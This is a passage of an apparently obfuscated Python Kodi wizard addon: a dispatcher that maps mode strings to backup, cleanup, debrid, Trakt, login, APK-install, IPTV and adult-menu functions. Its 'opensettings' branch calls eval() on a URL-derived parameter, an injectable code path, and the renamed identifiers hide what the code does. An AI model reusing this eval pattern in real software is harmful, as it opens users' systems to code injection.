    elif O0O00O0OOO0000000 =='advancedsetting':advancedWindow (name )#line:5565
    elif O0O00O0OOO0000000 =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5566
    elif O0O00O0OOO0000000 =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5567
    elif O0O00O0OOO0000000 =='asciicheck':wiz .asciiCheck ()#line:5568
    elif O0O00O0OOO0000000 =='backupbuild':wiz .backUpOptions ('build')#line:5569
    elif O0O00O0OOO0000000 =='backupgui':wiz .backUpOptions ('guifix')#line:5570
    elif O0O00O0OOO0000000 =='backuptheme':wiz .backUpOptions ('theme')#line:5571
    elif O0O00O0OOO0000000 =='backupaddon':wiz .backUpOptions ('addondata')#line:5572
    elif O0O00O0OOO0000000 =='oldThumbs':wiz .oldThumbs ()#line:5573
    elif O0O00O0OOO0000000 =='clearbackup':wiz .cleanupBackup ()#line:5574
    elif O0O00O0OOO0000000 =='convertpath':wiz .convertSpecial (HOME )#line:5575
    elif O0O00O0OOO0000000 =='currentsettings':viewAdvanced ()#line:5576
    elif O0O00O0OOO0000000 =='fullclean':totalClean ();wiz .refresh ()#line:5577
    elif O0O00O0OOO0000000 =='clearcache':clearCache ();wiz .refresh ()#line:5578
    elif O0O00O0OOO0000000 =='fixwizard':fixwizard ();wiz .refresh ()#line:5579
    elif O0O00O0OOO0000000 =='testcommand':testcommand ()#line:5580
    elif O0O00O0OOO0000000 =='logsend':logsend ()#line:5581
    elif O0O00O0OOO0000000 =='setrd':setrealdebrid ()#line:5582
    elif O0O00O0OOO0000000 =='setrd2':setautorealdebrid ()#line:5583
    elif O0O00O0OOO0000000 =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5584
    elif O0O00O0OOO0000000 =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5585
    elif O0O00O0OOO0000000 =='clearthumb':clearThumb ();wiz .refresh ()#line:5586
    elif O0O00O0OOO0000000 =='checksources':wiz .checkSources ();wiz .refresh ()#line:5587
    elif O0O00O0OOO0000000 =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5588
    elif O0O00O0OOO0000000 =='freshstart':freshStart ()#line:5589
    elif O0O00O0OOO0000000 =='forceupdate':wiz .forceUpdate ()#line:5590
    elif O0O00O0OOO0000000 =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5591
    elif O0O00O0OOO0000000 =='forceclose':wiz .killxbmc ()#line:5592
    elif O0O00O0OOO0000000 =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5593
    elif O0O00O0OOO0000000 =='hidepassword':wiz .hidePassword ()#line:5594
    elif O0O00O0OOO0000000 =='unhidepassword':wiz .unhidePassword ()#line:5595
    elif O0O00O0OOO0000000 =='enableaddons':enableAddons ()#line:5596
    elif O0O00O0OOO0000000 =='toggleaddon':wiz .toggleAddon (name ,OOOO00OOO0O0OO00O );wiz .refresh ()#line:5597
    elif O0O00O0OOO0000000 =='togglecache':toggleCache (name );wiz .refresh ()#line:5598
    elif O0O00O0OOO0000000 =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5599
    elif O0O00O0OOO0000000 =='changefeq':changeFeq ();wiz .refresh ()#line:5600
    elif O0O00O0OOO0000000 =='uploadlog':uploadLog .Main ()#line:5601
    elif O0O00O0OOO0000000 =='viewlog':LogViewer ()#line:5602
    elif O0O00O0OOO0000000 =='viewwizlog':LogViewer (WIZLOG )#line:5603
    elif O0O00O0OOO0000000 =='viewerrorlog':errorChecking (all =True )#line:5604
    elif O0O00O0OOO0000000 =='clearwizlog':O0OO0OO0O0OO0OO00 =open (WIZLOG ,'w');O0OO0OO0O0OO0OO00 .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5605
    elif O0O00O0OOO0000000 =='purgedb':purgeDb ()#line:5606
    elif O0O00O0OOO0000000 =='fixaddonupdate':fixUpdate ()#line:5607
    elif O0O00O0OOO0000000 =='removeaddons':removeAddonMenu ()#line:5608
    elif O0O00O0OOO0000000 =='removeaddon':removeAddon (name )#line:5609
    elif O0O00O0OOO0000000 =='removeaddondata':removeAddonDataMenu ()#line:5610
    elif O0O00O0OOO0000000 =='removedata':removeAddonData (name )#line:5611
    elif O0O00O0OOO0000000 =='resetaddon':O00OO0O00OO0OO0O0 =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5612
    elif O0O00O0OOO0000000 =='systeminfo':systemInfo ()#line:5613
    elif O0O00O0OOO0000000 =='restorezip':restoreit ('build')#line:5614
    elif O0O00O0OOO0000000 =='restoregui':restoreit ('gui')#line:5615
    elif O0O00O0OOO0000000 =='restoreaddon':restoreit ('addondata')#line:5616
    elif O0O00O0OOO0000000 =='restoreextzip':restoreextit ('build')#line:5617
    elif O0O00O0OOO0000000 =='restoreextgui':restoreextit ('gui')#line:5618
    elif O0O00O0OOO0000000 =='restoreextaddon':restoreextit ('addondata')#line:5619
    elif O0O00O0OOO0000000 =='writeadvanced':writeAdvanced (name ,OOOO00OOO0O0OO00O )#line:5620
    elif O0O00O0OOO0000000 =='traktsync':traktsync ()#line:5621
    elif O0O00O0OOO0000000 =='apk':apkMenu (name )#line:5623
    elif O0O00O0OOO0000000 =='apkscrape':apkScraper (name )#line:5624
    elif O0O00O0OOO0000000 =='apkinstall':apkInstaller (name ,OOOO00OOO0O0OO00O )#line:5625
    elif O0O00O0OOO0000000 =='speed':speedMenu ()#line:5626
    elif O0O00O0OOO0000000 =='net':net_tools ()#line:5627
    elif O0O00O0OOO0000000 =='GetList':GetList (OOOO00OOO0O0OO00O )#line:5628
    elif O0O00O0OOO0000000 =='viewVideo':playVideo (OOOO00OOO0O0OO00O )#line:5629
    elif O0O00O0OOO0000000 =='addons':addonMenu (name )#line:5631
    elif O0O00O0OOO0000000 =='addoninstall':addonInstaller (name ,OOOO00OOO0O0OO00O )#line:5632
    elif O0O00O0OOO0000000 =='savedata':saveMenu ()#line:5634
    elif O0O00O0OOO0000000 =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5635
    elif O0O00O0OOO0000000 =='whitelist':wiz .whiteList (name )#line:5637
    elif O0O00O0OOO0000000 =='trakt':traktMenu ()#line:5639
    elif O0O00O0OOO0000000 =='savetrakt':traktit .traktIt ('update',name )#line:5640
    elif O0O00O0OOO0000000 =='restoretrakt':traktit .traktIt ('restore',name )#line:5641
    elif O0O00O0OOO0000000 =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5642
    elif O0O00O0OOO0000000 =='cleartrakt':traktit .clearSaved (name )#line:5643
    elif O0O00O0OOO0000000 =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5644
    elif O0O00O0OOO0000000 =='updatetrakt':traktit .autoUpdate ('all')#line:5645
    elif O0O00O0OOO0000000 =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5646
    elif O0O00O0OOO0000000 =='realdebrid':realMenu ()#line:5648
    elif O0O00O0OOO0000000 =='savedebrid':debridit .debridIt ('update',name )#line:5649
    elif O0O00O0OOO0000000 =='restoredebrid':debridit .debridIt ('restore',name )#line:5650
    elif O0O00O0OOO0000000 =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5651
    elif O0O00O0OOO0000000 =='cleardebrid':debridit .clearSaved (name )#line:5652
    elif O0O00O0OOO0000000 =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5653
    elif O0O00O0OOO0000000 =='updatedebrid':debridit .autoUpdate ('all')#line:5654
    elif O0O00O0OOO0000000 =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5655
    elif O0O00O0OOO0000000 =='login':loginMenu ()#line:5657
    elif O0O00O0OOO0000000 =='savelogin':loginit .loginIt ('update',name )#line:5658
    elif O0O00O0OOO0000000 =='restorelogin':loginit .loginIt ('restore',name )#line:5659
    elif O0O00O0OOO0000000 =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5660
    elif O0O00O0OOO0000000 =='clearlogin':loginit .clearSaved (name )#line:5661
    elif O0O00O0OOO0000000 =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5662
    elif O0O00O0OOO0000000 =='updatelogin':loginit .autoUpdate ('all')#line:5663
    elif O0O00O0OOO0000000 =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5664
    elif O0O00O0OOO0000000 =='contact':notify .contact (CONTACT )#line:5666
    elif O0O00O0OOO0000000 =='settings':wiz .openS (name );wiz .refresh ()#line:5667
    elif O0O00O0OOO0000000 =='opensettings':OOOOO0000O00O0000 =eval (OOOO00OOO0O0OO00O .upper ()+'ID')[name ]['plugin'];OO0O00O0O00O0O000 =wiz .addonId (OOOOO0000O00O0000 );OO0O00O0O00O0O000 .openSettings ();wiz .refresh ()#line:5668
    elif O0O00O0OOO0000000 =='developer':developer ()#line:5670
    elif O0O00O0OOO0000000 =='converttext':wiz .convertText ()#line:5671
    elif O0O00O0OOO0000000 =='createqr':wiz .createQR ()#line:5672
    elif O0O00O0OOO0000000 =='testnotify':testnotify ()#line:5673
    elif O0O00O0OOO0000000 =='testnotify2':testnotify2 ()#line:5674
    elif O0O00O0OOO0000000 =='servicemanual':servicemanual ()#line:5675
    elif O0O00O0OOO0000000 =='fastinstall':fastinstall ()#line:5676
    elif O0O00O0OOO0000000 =='testupdate':testupdate ()#line:5677
    elif O0O00O0OOO0000000 =='testfirst':testfirst ()#line:5678
    elif O0O00O0OOO0000000 =='testfirstrun':testfirstRun ()#line:5679
    elif O0O00O0OOO0000000 =='testapk':notify .apkInstaller ('SPMC')#line:5680
    elif O0O00O0OOO0000000 =='bg':wiz .bg_install (name ,OOOO00OOO0O0OO00O )#line:5682
    elif O0O00O0OOO0000000 =='bgcustom':wiz .bg_custom ()#line:5683
    elif O0O00O0OOO0000000 =='bgremove':wiz .bg_remove ()#line:5684
    elif O0O00O0OOO0000000 =='bgdefault':wiz .bg_default ()#line:5685
    elif O0O00O0OOO0000000 =='rdset':rdsetup ()#line:5686
    elif O0O00O0OOO0000000 =='mor':morsetup ()#line:5687
    elif O0O00O0OOO0000000 =='mor2':morsetup2 ()#line:5688
    elif O0O00O0OOO0000000 =='firstinstall':firstinstall ()#line:5689
    elif O0O00O0OOO0000000 =='resolveurl':resolveurlsetup ()#line:5690
    elif O0O00O0OOO0000000 =='urlresolver':urlresolversetup ()#line:5691
    elif O0O00O0OOO0000000 =='forcefastupdate':forcefastupdate ()#line:5692
    elif O0O00O0OOO0000000 =='help_install':help_install ()#line:5693
    elif O0O00O0OOO0000000 =='traktset':traktsetup ()#line:5695
    elif O0O00O0OOO0000000 =='placentaset':placentasetup ()#line:5696
    elif O0O00O0OOO0000000 =='flixnetset':flixnetsetup ()#line:5697
    elif O0O00O0OOO0000000 =='reptiliaset':reptiliasetup ()#line:5698
    elif O0O00O0OOO0000000 =='yodasset':yodasetup ()#line:5699
    elif O0O00O0OOO0000000 =='numbersset':numberssetup ()#line:5700
    elif O0O00O0OOO0000000 =='uranusset':uranussetup ()#line:5701
    elif O0O00O0OOO0000000 =='genesisset':genesissetup ()#line:5702
    elif O0O00O0OOO0000000 =='fastupdate':fastupdate ()#line:5703
    elif O0O00O0OOO0000000 =='folderback':folderback ()#line:5704
    elif O0O00O0OOO0000000 =='menudata':Menu ()#line:5705
    elif O0O00O0OOO0000000 =='infoupdate':infobuild (False )#line:5706
    elif O0O00O0OOO0000000 =='infoupdate_busydialog':infoupdate_busydialog (False )#line:5707
    elif O0O00O0OOO0000000 =='wait':wait ()#line:5708
    elif O0O00O0OOO0000000 ==2 :#line:5709
            wiz .torent_menu ()#line:5710
    elif O0O00O0OOO0000000 ==3 :#line:5711
            wiz .popcorn_menu ()#line:5712
    elif O0O00O0OOO0000000 ==8 :#line:5713
            wiz .metaliq_fix ()#line:5714
    elif O0O00O0OOO0000000 ==9 :#line:5715
            wiz .quasar_menu ()#line:5716
    elif O0O00O0OOO0000000 ==5 :#line:5717
            swapSkins ('skin.Premium.mod')#line:5718
    elif O0O00O0OOO0000000 ==13 :#line:5719
            wiz .elementum_menu ()#line:5720
    elif O0O00O0OOO0000000 ==16 :#line:5721
            wiz .fix_wizard ()#line:5722
    elif O0O00O0OOO0000000 ==17 :#line:5723
            wiz .last_play ()#line:5724
    elif O0O00O0OOO0000000 ==18 :#line:5725
            wiz .normal_metalliq ()#line:5726
    elif O0O00O0OOO0000000 ==19 :#line:5727
            wiz .fast_metalliq ()#line:5728
    elif O0O00O0OOO0000000 ==20 :#line:5729
            wiz .fix_buffer2 ()#line:5730
    elif O0O00O0OOO0000000 ==21 :#line:5731
            wiz .fix_buffer3 ()#line:5732
    elif O0O00O0OOO0000000 ==11 :#line:5733
            wiz .fix_buffer ()#line:5734
    elif O0O00O0OOO0000000 ==15 :#line:5735
            wiz .fix_font ()#line:5736
    elif O0O00O0OOO0000000 ==14 :#line:5737
            wiz .clean_pass ()#line:5738
    elif O0O00O0OOO0000000 ==22 :#line:5739
            wiz .movie_update ()#line:5740
    elif O0O00O0OOO0000000 =='simpleiptv':#line:5743
        OOOOO0OO0OO0OOO00 =xbmcgui .Dialog ()#line:5745
        O0O00O000OOOO00OO =OOOOO0OO0OO0OOO00 .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:5746
        if O0O00O000OOOO00OO ==1 :#line:5747
            iptvkodi17_18 ()#line:5748
        else :#line:5750
         sys .exit ()#line:5751
    elif O0O00O0OOO0000000 =='sex_menu_open':sex_menu_open ()#line:5754
    elif O0O00O0OOO0000000 =='sex_menu_luck':sex_menu_luck (notify ='true')#line:5755
    elif O0O00O0OOO0000000 =='tv_widget_tele':tv_widget_tele (notify ='true')#line:5756
    elif O0O00O0OOO0000000 =='tv_widget_kitana':tv_widget_kitana (notify ='true')#line:5757
    elif O0O00O0OOO0000000 =='open_turkey':open_turkey ()#line:5758
    elif O0O00O0OOO0000000 =='force_update':force_update ()#line:5759
    elif O0O00O0OOO0000000 =='update_tele':auto_build_update (NOTEID )#line:5760
    elif O0O00O0OOO0000000 =='update_movie':auto_movie_update (NOTEID3 )#line:5761
    elif O0O00O0OOO0000000 =='adv_settings':auto_buffer ()#line:5762
    elif O0O00O0OOO0000000 =='adv_settings_fromskin':auto_buffer_fromskin ()#line:5763
    elif O0O00O0OOO0000000 =='cleanbuffer':clean_buffer ()#line:5764
    elif O0O00O0OOO0000000 =='getpass':getpass ()#line:5765
    elif O0O00O0OOO0000000 =='setpass':setpass ()#line:5766
    elif O0O00O0OOO0000000 =='setuname':setuname ()#line:5767
    elif O0O00O0OOO0000000 =='check_firebase':check_firebase ()#line:5768
    elif O0O00O0OOO0000000 =='passandUsername':passandUsername ()#line:5770
    elif O0O00O0OOO0000000 =='9':disply_hwr ()#line:5771
    elif O0O00O0OOO0000000 =='99':disply_hwr2 ()#line:5772
    elif O0O00O0OOO0000000 =='80':send_hwr ()#line:5773
    elif O0O00O0OOO0000000 =='linux':linux_pack ()#line:5774
    elif O0O00O0OOO0000000 =='telemedia5':telemedia5 ()#line:5775
    xbmcplugin .endOfDirectory (int (sys .argv [1 ]))